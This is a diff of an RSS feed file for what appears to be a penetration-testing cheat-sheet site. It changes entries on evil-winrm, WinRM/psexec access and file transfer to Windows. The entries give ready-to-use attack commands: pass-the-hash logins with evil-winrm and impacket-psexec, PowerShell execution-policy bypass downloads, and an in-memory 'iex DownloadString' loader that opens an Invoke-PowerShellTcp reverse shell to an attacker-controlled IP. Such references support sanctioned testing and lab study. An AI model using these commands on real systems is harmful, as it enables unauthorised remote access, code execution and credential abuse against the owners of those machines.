@@ -8,18 +8,11 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@evil-winrm/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>evil-winrm</title>
-      <link>https://tldrbins.github.io/evil-winrm/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/evil-winrm/</guid>
-      <description>Connection Methods Password Hash Kerberos crt &amp; key evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; $ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p &amp;#39;qwe123QWE!@#&amp;#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Dr.Zaiuss\Documents&amp;gt; evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; # Step 1: Edit &amp;#39;/etc/krb5.</description>
-    </item>
-    <item>
       <title>File Transfer (Linux to Windows)</title>
       <link>https://tldrbins.github.io/file_transfer_linux_to_windows/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_linux_to_windows/</guid>
-      <description>Powershell cmd evil-winrm Start a Local HTTP Server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; $ python3 -m http.server 8443 Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ... # Invoke-WebRequest iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o C:\ProgramData\&amp;lt;FILE&amp;gt; Note: PowerShell 3.0+&#xA;# Curl powershell -ep bypass curl &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o C:\ProgramData\&amp;lt;FILE&amp;gt; Note: curl is not always available&#xA;# Load into memory and Run # Invoke-Expression iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/rev.ps1&amp;#39;);Invoke-PowerShellTcp -Reverse -IPAddress &amp;lt;LOCAL_IP&amp;gt; -Port &amp;lt;LOCAL_PORT&amp;gt; # Short version iex (iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/rev.</description>
+      <description>Powershell cmd evil-winrm Start a Local HTTP Server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; $ python3 -m http.server 8443 Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ... # Invoke-WebRequest iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o C:\ProgramData\&amp;lt;FILE&amp;gt; # Wget powershell -ep bypass wget &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -Outfile C:\ProgramData\&amp;lt;FILE&amp;gt; # Curl powershell -ep bypass curl &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -Outfile C:\ProgramData\&amp;lt;FILE&amp;gt; Note: curl and wget are alias to Invoke-WebRequest&#xA;# Load into memory and Run # Invoke-Expression iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt;&amp;#39;);Invoke-PowerShellTcp -Reverse -IPAddress &amp;lt;LOCAL_IP&amp;gt; -Port &amp;lt;LOCAL_PORT&amp;gt; # Short version iex (iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -UseBasicParsing) Ref: rev.</description>
     </item>
     <item>
       <title>File Transfer (Windows To Linux)</title>
@@ -27,6 +20,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
       <description>SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share # Connect to SMB server with creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share /u:&amp;lt;USER&amp;gt; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # From target Windows to local Linux copy &amp;lt;FILE&amp;gt; \\&amp;lt;LOCAL_IP&amp;gt;\share # From local Linux to target Windows copy \\&amp;lt;LOCAL_IP&amp;gt;\share\&amp;lt;FILE&amp;gt; &amp;lt;FILE&amp;gt; # Delete file del &amp;lt;FILE&amp;gt; # Remove SMB share net use /d \\&amp;lt;LOCAL_IP&amp;gt;\share # Older Windows (e.</description>
+    </item>
+    <item>
+      <title>Winrm</title>
+      <link>https://tldrbins.github.io/winrm/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/winrm/</guid>
+      <description>Psexec Password Hash # Domain auth impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Local auth impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Domain auth impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; # Local auth impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; Evil-Winrm Password Hash Kerberos crt &amp; key evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; $ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p &amp;#39;qwe123QWE!@#&amp;#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.</description>
     </item>
   </channel>
 </rss>
